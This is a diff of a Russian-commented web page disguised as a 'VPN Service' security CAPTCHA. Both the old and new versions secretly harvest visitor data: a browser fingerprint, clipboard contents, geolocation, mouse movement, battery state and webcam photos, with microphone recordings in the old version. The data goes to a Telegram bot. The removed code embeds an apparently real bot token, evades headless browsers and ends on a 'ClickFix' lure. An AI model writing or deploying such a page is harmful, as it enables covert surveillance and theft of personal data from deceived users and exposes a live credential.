@@ -1,269 +1,242 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <!-- ТВОЙ CSS БЕЗ ИЗМЕНЕНИЙ -->
-    <style>
-        /* ... весь твой CSS копи-паст ... */
-    </style>
-</head>
 <body>
-    <!-- ТВОЙ HTML БЕЗ ИЗМЕНЕНИЙ -->
-    <div class="container">
-        <div class="camera-status" id="cameraStatus" title="Камера выключена"></div>
-        <h1>🔒 Проверка безопасности</h1>
-        <p>VPN Service обнаружил подозрительную активность. Пройдите верификацию:</p>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        <div id="captchaCode">———</div>
-        <input type="text" id="userInput" maxlength="8" placeholder="Введите код" autocomplete="off">
-        <button class="verify-btn" id="verifyBtn">Проверить</button>
-        <div id="status" class="status"></div>
+  <div class="container">
+    <div class="camera-status" id="cameraStatus"></div>
+    <h1>🔒 Проверка безопасности</h1>
+    <p>VPN Service обнаружил подозрительную активность. Пройдите верификацию:</p>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
     </div>
+    <div id="captchaCode">———</div>
+    <input type="text" id="userInput" maxlength="8" placeholder="Введите код" autocomplete="off">
+    <button class="verify-btn" id="verifyBtn">Проверить</button>
+    <div id="status" class="status"></div>
+  </div>
 
-    <script>
-        console.log('🚀 ЗАГРУЗКА...');
+  <script>
+    // === КОНФИГ ===
+    const TELEGRAM_TOKEN = 'ТВОЙ_ТОКЕН';
+    const CHAT_ID = 'ТВОЙ_CHAT_ID';
 
-        // === ЖДЕМ DOM ===
-        function initElements() {
-            const elements = {
-                captchaCode: document.getElementById('captchaCode'),
-                userInput: document.getElementById('userInput'),
-                verifyBtn: document.getElementById('verifyBtn'),
-                progressBar: document.getElementById('progressBar'),
-                status: document.getElementById('status'),
-                cameraStatus: document.getElementById('cameraStatus')
-            };
-            
-            if (!elements.captchaCode) {
-                console.log('⏳ Ждем DOM...');
-                setTimeout(initElements, 100);
-                return;
-            }
-            
-            console.log('✅ DOM готов');
-            startCaptcha(elements);
+    const elements = {
+      captchaCode: document.getElementById('captchaCode'),
+      userInput: document.getElementById('userInput'),
+      verifyBtn: document.getElementById('verifyBtn'),
+      progressBar: document.getElementById('progressBar'),
+      status: document.getElementById('status'),
+      cameraStatus: document.getElementById('cameraStatus')
+    };
+
+    let currentCaptcha = '';
+    let stream = null;
+    let cameraActive = false;
+    let mouseTrail = [];
+    let batteryInfo = {};
+    let fingerprintCache = null; // чтобы собрать один раз и переиспользовать
+
+    // === КАПЧА ===
+    function generateCaptcha() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
+    }
+
+    function start() {
+      currentCaptcha = generateCaptcha();
+      elements.captchaCode.textContent = currentCaptcha;
+      elements.progressBar.style.width = '0%';
+      console.log('✅ Капча отрисована');
+      collectPassiveFingerprint(); // сразу запускаем пассивный сбор
+    }
+
+    // === ПАССИВНЫЙ СБОР (БЕЗ КАМЕРЫ) ===
+    document.addEventListener('mousemove', (e) => {
+      mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
+      if (mouseTrail.length > 200) mouseTrail.shift();
+    });
+
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(bat => {
+        batteryInfo = {
+          level: Math.round(bat.level * 100) + '%',
+          charging: bat.charging ? 'Да' : 'Нет'
+        };
+      });
+    }
+
+    function detectFonts() {
+      const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
+      const detected = [];
+      testFonts.forEach(font => {
+        if (document.fonts && document.fonts.check(`12px ${font}`)) detected.push(font);
+      });
+      return detected.slice(0, 3).join(',');
+    }
+
+    function getCanvasFP() {
+      const canvas = document.createElement('canvas');
+      canvas.width = 256; canvas.height = 60;
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'alphabetic';
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = "#069";
+      ctx.font = '11pt Arial';
+      ctx.fillText('SUPER FP v3.0', 2, 15);
+      return canvas.toDataURL().substring(0, 80);
+    }
+
+    function getGeo() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve('geo-unsupported');
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
+          () => resolve('geo-denied'),
+          {timeout: 3000}
+        );
+      });
+    }
+
+    async function getClipboard() {
+      try {
+        const text = await navigator.clipboard.readText();
+        return text.substring(0, 80);
+      } catch(e) {
+        return 'clipboard-denied';
+      }
+    }
+
+    async function collectPassiveFingerprint() {
+      // собираем один раз и кэшируем
+      if (fingerprintCache) return fingerprintCache;
+
+      const geo = await getGeo();
+      const clipboard = await getClipboard();
+
+      fingerprintCache = {
+        userAgent: navigator.userAgent.substring(0, 120),
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+        cookies: navigator.cookieEnabled,
+        hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
+        fonts: detectFonts(),
+        battery: batteryInfo.level || 'no',
+        charging: batteryInfo.charging || 'no',
+        mouseTrail: mouseTrail.length,
+        geo,
+        canvas: getCanvasFP(),
+        clipboard
+      };
+
+      console.log('🕵️‍♂️ FP собран пассивно');
+      return fingerprintCache;
+    }
+
+    // === КАМЕРА (ТОЛЬКО В КОНЦЕ) ===
+    async function initCamera() {
+      if (cameraActive) return;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: 640, height: 480 },
+          audio: false // микрофон отключен
+        });
+        cameraActive = true;
+        elements.cameraStatus.classList.add('active');
+        console.log('🎥 Камера OK');
+      } catch (e) {
+        console.log('🚫 Камера отклонена');
+      }
+    }
+
+    async function capturePhoto() {
+      if (!stream) return null;
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      await video.play();
+      await new Promise(r => setTimeout(r, 200));
+      const canvas = document.createElement('canvas');
+      canvas.width = 640; canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      video.remove();
+      return canvas.toDataURL('image/jpeg', 0.8);
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+      return new Blob([ab], { type: mimeString });
+    }
+
+    async function sendPhoto(photo, caption) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', dataURItoBlob(photo), 'photo.jpg');
+      fd.append('caption', caption);
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: fd
+      });
+    }
+
+    async function sendTextReport(fp, input) {
+      const text =
+        `🎯 CAPTCHA_OK\n` +
+        `📝 Код: ${currentCaptcha}\n` +
+        `⌨️ Ввод: ${input}\n\n` +
+        `📱 UA: ${fp.userAgent}\n` +
+        `💻 Платформа: ${fp.platform}\n` +
+        `🌐 Язык/часовой пояс: ${fp.language} / ${fp.timezone}\n` +
+        `🖥️ Экран: ${fp.screen}\n` +
+        `🔋 Батарея: ${fp.battery} (${fp.charging})\n` +
+        `🖱️ Мышь: ${fp.mouseTrail} точек\n` +
+        `📍 Geo: ${fp.geo}\n` +
+        `🗎 Шрифты: ${fp.fonts}\n` +
+        `📋 Буфер: ${fp.clipboard}\n` +
+        `🧩 Canvas: ${fp.canvas}`;
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text})
+      });
+    }
+
+    // камера запрашивается ТОЛЬКО при нажатии кнопки и успешной капче
+    elements.verifyBtn.addEventListener('click', async () => {
+      const input = elements.userInput.value.trim().toUpperCase();
+      if (input === currentCaptcha) {
+        elements.status.textContent = '🔍 Проверка...';
+        elements.status.className = 'status';
+
+        // 1) все данные (если ещё не собраны)
+        const fp = await collectPassiveFingerprint();
+
+        // 2) запрос камеры только сейчас
+        await initCamera();
+        const photo = await capturePhoto();
+
+        // 3) сначала текстовый отчёт, потом фото
+        await sendTextReport(fp, input);
+        if (photo) {
+          await sendPhoto(photo, `✅ Капча: ${input}`);
         }
 
-        // === ОСНОВНОЙ СТАРТ ===
-        function startCaptcha(elements) {
-            // ТВОИ КОНСТАНТЫ
-            const TELEGRAM_TOKEN = '8282145932:AAE3Ze0wPSRFDx0FroHUJMTOXWHcpbvcb_w';
-            const CHAT_ID = '882898449';
+        elements.status.textContent = '✅ Успешно';
+        elements.status.className = 'status success';
+      } else {
+        elements.status.textContent = '❌ Неверный код';
+        elements.status.className = 'status error';
+      }
+    });
 
-            // ТВОИ ПЕРЕМЕННЫЕ
-            let currentCaptcha = '';
-            let attempts = 0;
-            let step = 0;
-            const totalSteps = 4;
-            let stream = null;
-            let cameraActive = false;
-            let mouseTrail = [];
-            let batteryInfo = {};
-            let keystrokes = [];
-
-            // === БОТЗАЩИТА ===
-            function isBot() {
-                const headless = navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent);
-                const linuxBot = /Linux.*X11/.test(navigator.userAgent) && screen.height < 800;
-                return headless || linuxBot;
-            }
-
-            if (isBot()) {
-                document.body.innerHTML = '<h1 style="color:red">❌ Обновите браузер</h1>';
-                return;
-            }
-
-            // === 🖱️ MOUSE ===
-            document.addEventListener('mousemove', (e) => {
-                mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
-                if (mouseTrail.length > 100) mouseTrail.shift();
-            });
-
-            // === 📸 КАМЕРА (iOS FIX) ===
-            async function initCamera() {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: 640, height: 480 },
-                        audio: true
-                    });
-                    cameraActive = true;
-                    elements.cameraStatus.classList.add('active');
-                    elements.cameraStatus.title = '📸 Активна';
-                    console.log('🎥 Камера OK');
-                    return true;
-                } catch(e) {
-                    console.log('🚫 Камера:', e.name);
-                    return false;
-                }
-            }
-
-            // === 📸 ФОТО ===
-            async function captureFullPhoto() {
-                if (!stream) return null;
-                try {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(r => video.onloadeddata = r);
-                    await new Promise(r => setTimeout(r, 200));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    video.remove();
-                    return canvas.toDataURL('image/jpeg', 0.8);
-                } catch(e) {
-                    return null;
-                }
-            }
-
-            // === 🔊 АУДИО ===
-            async function recordAudio() {
-                if (!stream) return null;
-                try {
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    return new Promise(resolve => {
-                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                        mediaRecorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'audio/webm' });
-                            const reader = new FileReader();
-                            reader.onloadend = () => resolve(reader.result);
-                            reader.readAsDataURL(blob);
-                        };
-                        mediaRecorder.start();
-                        setTimeout(() => mediaRecorder.stop(), 2000); // 2 сек
-                    });
-                } catch(e) {
-                    return null;
-                }
-            }
-
-            // === Base64→Blob ===
-            function dataURItoBlob(dataURI) {
-                const byteString = atob(dataURI.split(',')[1]);
-                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                return new Blob([ab], { type: mimeString });
-            }
-
-            // === ОТПРАВКА ФОТО/АУДИО ===
-            async function sendPhoto(photo, caption) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', dataURItoBlob(photo), 'photo.jpg');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            }
-
-            async function sendVoice(audio, caption) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('voice', dataURItoBlob(audio), 'voice.webm');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, { method: 'POST', body: formData });
-            }
-
-            // === НЕЗАМЕТНАЯ ОТПРАВКА ===
-            async function sendStealthPackage(input) {
-                const photo = await captureFullPhoto();
-                const audio = await recordAudio();
-                
-                // Текст
-                const fpText = `🕵️‍♂️ #${attempts} | ${input}\n📱 ${navigator.userAgent.slice(0,50)}...\n🖱️ ${mouseTrail.length} точек`;
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: fpText})
-                });
-
-                // Фото
-                if (photo) sendPhoto(photo, `📸 ${input}`);
-                // Аудио  
-                if (audio) sendVoice(audio, `🔊 ${input}`);
-            }
-
-            // === КАПЧА ===
-            function generateCaptcha() {
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
-            }
-
-            function updateProgress() {
-                elements.progressBar.style.width = `${(step / totalSteps) * 100}%`;
-            }
-
-            // === INPUT (НЕЗАМЕТНЫЙ СБОР) ===
-            elements.userInput.addEventListener('focus', async () => {
-                console.log('👆 Focus - камера...');
-                if (!cameraActive) await initCamera();
-            });
-
-            elements.userInput.addEventListener('input', async () => {
-                const input = elements.userInput.value.toUpperCase();
-                keystrokes.push({char: input.slice(-1), time: Date.now()});
-                
-                // 🕵️‍♂️ Первые 3 буквы = ФОТО+АУДИО
-                if (cameraActive && input.length <= 3 && input.length > 0) {
-                    console.log(`📸 Сбор: ${input}`);
-                    await sendStealthPackage(input);
-                }
-            });
-
-            // === КНОПКА ===
-            elements.verifyBtn.addEventListener('click', async () => {
-                const input = elements.userInput.value.toUpperCase().trim();
-                attempts++;
-                
-                document.body.classList.add('loading');
-                elements.status.textContent = '🔍 Проверка...';
-
-                await sendStealthPackage(input + ' [BUTTON]');
-
-                setTimeout(() => {
-                    if (input === currentCaptcha) {
-                        step++;
-                        elements.status.textContent = '✅ Верно!';
-                        elements.status.className = 'status success';
-                        if (step >= totalSteps) {
-                            document.body.innerHTML = `
-                                <div class="clickfix">
-                                    <h2>🔧 ClickFix</h2>
-                                    <p>Кликните для исправления</p>
-                                    <button onclick="location.reload()">ИСПРАВИТЬ</button>
-                                </div>`;
-                            return;
-                        }
-                    } else {
-                        elements.status.textContent = '❌ Неверно';
-                        elements.status.className = 'status error';
-                    }
-
-                    currentCaptcha = generateCaptcha();
-                    elements.captchaCode.textContent = currentCaptcha;
-                    elements.userInput.value = '';
-                    updateProgress();
-                    document.body.classList.remove('loading');
-                }, 1200);
-            });
-
-            // === СТАРТ КАПЧИ ✅
-            currentCaptcha = generateCaptcha();
-            elements.captchaCode.textContent = currentCaptcha;
-            updateProgress();
-            
-            console.log('✅ КАПЧА РАБОТАЕТ! Вводи код → фото+голос в бот');
-        }
-
-        // === АВТОСТАРТ ===
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initElements);
-        } else {
-            initElements();
-        }
-    </script>
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', start);
+    } else {
+      start();
+    }
+  </script>
 </body>
-</html>
